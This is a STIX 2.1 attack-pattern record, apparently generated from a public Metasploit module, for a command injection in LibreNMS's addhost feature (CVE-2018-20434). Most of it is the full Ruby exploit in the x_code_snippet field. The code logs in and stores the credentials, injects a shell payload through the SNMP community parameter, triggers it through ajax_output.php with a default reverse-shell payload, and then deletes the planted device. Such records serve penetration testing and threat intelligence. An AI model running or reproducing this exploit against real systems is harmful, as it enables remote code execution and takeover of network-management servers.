{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9b0dbbb8-da45-4ec4-88e3-684ba0046f82",
    "created": "2024-08-14T17:03:23.767548Z",
    "modified": "2024-08-14T17:03:23.767552Z",
    "name": "LibreNMS addhost Command Injection",
    "description": "( This module exploits a command injection vulnerability in the open source network management software known as LibreNMS. The community parameter used in a POST request to the addhost functionality is unsanitized. This parameter is later used as part of a shell command that gets passed to the popen function in capture.inc.php, which can result in execution of arbitrary code.  This module requires authentication to LibreNMS first. ) 'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/librenms_addhost_cmd_inject.rb",
            "external_id": "librenms_addhost_cmd_inject.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-20434"
        },
        {
            "source_name": "reference",
            "url": "https://shells.systems/librenms-v1-46-remote-code-execution-cve-2018-20434/"
        },
        {
            "source_name": "reference",
            "url": "https://gist.github.com/mhaskar/516df57aafd8c6e3a1d70765075d372d"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'LibreNMS addhost Command Injection',\n      'Description'    => %q(\n         This module exploits a command injection vulnerability in the open source\n         network management software known as LibreNMS. The community parameter used\n         in a POST request to the addhost functionality is unsanitized. This parameter\n         is later used as part of a shell command that gets passed to the popen function\n         in capture.inc.php, which can result in execution of arbitrary code.\n\n         This module requires authentication to LibreNMS first.\n      ),\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n      [\n        'mhaskar',       # Vulnerability discovery and PoC\n        'Shelby Pace'    # Metasploit module\n      ],\n      'References'     =>\n        [\n          [ 'CVE', '2018-20434' ],\n          [ 'URL', 'https://shells.systems/librenms-v1-46-remote-code-execution-cve-2018-20434/' ],\n          [ 'URL', 'https://gist.github.com/mhaskar/516df57aafd8c6e3a1d70765075d372d' ]\n        ],\n      'Arch'           => ARCH_CMD,\n      'Targets'        =>\n        [\n          [ 'Linux',\n            {\n              'Platform' => 'unix',\n              'DefaultOptions'  =>  { 'Payload' =>  'cmd/unix/reverse' }\n            }\n          ]\n        ],\n      'DisclosureDate' => '2018-12-16',\n      'DefaultTarget'  => 0\n    ))\n\n    register_options(\n    [\n      OptString.new('TARGETURI', [ true, 'Base LibreNMS path', '/' ]),\n      OptString.new('USERNAME', [ true, 'User name for LibreNMS', '' ]),\n      OptString.new('PASSWORD', [ true, 'Password for LibreNMS', '' ])\n    ])\n  end\n\n  def login\n    login_uri = normalize_uri(target_uri.path, 'login')\n    res = send_request_cgi('method' =>  'GET', 'uri'  =>  login_uri)\n    fail_with(Failure::NotFound, 'Failed to access the login page') unless res && res.code == 200\n\n    cookies = res.get_cookies\n\n    login_res = send_request_cgi(\n      'method'    =>  'POST',\n      'uri'       =>  login_uri,\n      'cookie'    =>  cookies,\n      'vars_post' =>\n      {\n        'username'  =>  datastore['USERNAME'],\n        'password'  =>  datastore['PASSWORD']\n      }\n    )\n\n    fail_with(Failure::NoAccess, 'Failed to submit credentials to login page') unless login_res && login_res.code == 302\n\n    cookies = login_res.get_cookies\n    res = send_request_cgi('method' =>  'GET', 'uri'  =>  normalize_uri(target_uri.path), 'cookie' =>  cookies)\n    fail_with(Failure::NoAccess, 'Failed to log into LibreNMS') unless res && res.code == 200 && res.body.include?('Devices')\n\n    print_status('Successfully logged into LibreNMS. Storing credentials...')\n    store_valid_credential(user: datastore['USERNAME'], private: datastore['PASSWORD'])\n    login_res.get_cookies\n  end\n\n  def add_device(cookies)\n    add_uri = normalize_uri(target_uri.path, 'addhost')\n    @hostname = Rex::Text.rand_text_alpha(6...12)\n    comm_payload = \"'; #{payload.encoded}#'\"\n\n    res = send_request_cgi(\n      'method'    =>  'POST',\n      'uri'       =>  add_uri,\n      'cookie'    =>  cookies,\n      'vars_post'  =>\n      {\n        'snmp'            =>  'on',\n        'force_add'       =>  'on',\n        'snmpver'         =>  'v2c',\n        'hostname'        =>  @hostname,\n        'community'       =>  comm_payload,\n        'authalgo'        =>  'MD5',\n        'cryptoalgo'      =>  'AES',\n        'transport'       =>  'udp',\n        'port_assoc_mode' =>  'ifIndex'\n      }\n    )\n\n    fail_with(Failure::NotFound, 'Failed to add device') unless res && res.body.include?('Device added')\n    print_good(\"Successfully added device with hostname #{@hostname}\")\n\n    host_id = res.get_html_document.search('div[@class=\"alert alert-success\"]/a[@href]').text\n    fail_with(Failure::NotFound, \"Couldn't retrieve the id for the device\") if host_id.empty?\n    host_id = host_id.match(/(\\d+)/).nil? ? nil : host_id.match(/(\\d+)/)\n\n    fail_with(Failure::NotFound, 'Failed to retrieve a valid device id') if host_id.nil?\n\n    host_id\n  end\n\n  def del_device(id, cookies)\n    del_uri = normalize_uri(target_uri.path, 'delhost')\n    res = send_request_cgi(\n      'method'    =>  'POST',\n      'uri'       =>  del_uri,\n      'cookie'    =>  cookies,\n      'vars_post' =>\n      {\n        'id'      =>  id,\n        'confirm' =>  1\n      }\n    )\n\n    print_status('Unsure if device was deleted. No response received') unless res\n\n    if res.body.include?(\"Removed device #{@hostname.downcase}\")\n      print_good(\"Successfully deleted device with hostname #{@hostname} and id ##{id}\")\n    else\n      print_status('Failed to delete device. Manual deletion may be needed')\n    end\n  end\n\n  def exploit\n    exp_uri = normalize_uri(target_uri.path, 'ajax_output.php')\n    cookies = login\n\n    host_id = add_device(cookies)\n    send_request_cgi(\n      'method'    =>  'GET',\n      'uri'       =>  exp_uri,\n      'cookie'    =>  cookies,\n      'vars_get'  =>\n      {\n        'id'        =>  'capture',\n        'format'    =>  'text',\n        'type'      =>  'snmpwalk',\n        'hostname'  =>  @hostname\n      }\n    )\n\n    del_device(host_id, cookies)\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-12-16",
    "x_mitre_platforms": [
        "unix'"
    ]
}